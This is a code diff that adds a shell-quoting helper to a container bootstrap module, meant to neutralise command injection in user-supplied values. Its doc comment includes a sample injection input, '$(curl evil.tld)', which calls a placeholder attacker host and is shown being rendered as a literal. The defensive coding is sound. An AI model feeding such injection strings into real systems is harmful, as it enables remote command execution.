@@ -66,9 +66,28 @@ function toK8sLaunch(bootstrap) {
   };
 }
 
+/**
+ * Wrap a string as a POSIX-safe single-quoted shell literal. The only tricky
+ * character inside single quotes is `'` itself, which can't be escaped — so
+ * we close the quote, emit an escaped `'`, and reopen. Callers should use
+ * this for EVERY user-controlled value that gets interpolated into a shell
+ * command, so the shell never sees attacker-influenced data as syntax.
+ *
+ *   shellSingleQuote("ok")                   -> 'ok'
+ *   shellSingleQuote("a'b")                  -> 'a'\''b'
+ *   shellSingleQuote("$(curl evil.tld)")     -> '$(curl evil.tld)'   (literal)
+ *
+ * This is the single source of truth — agentFiles.ts / agentMigrations.ts /
+ * runtimeBootstrap.ts / authSync.ts / worker.ts all import from here.
+ */
+function shellSingleQuote(value) {
+  return `'${String(value ?? "").replace(/'/g, "'\\''")}'`;
+}
+
 module.exports = {
   buildContainerBootstrap,
   toDockerLaunch,
   toK8sLaunch,
+  shellSingleQuote,
   DEFAULT_SHELL,
 };
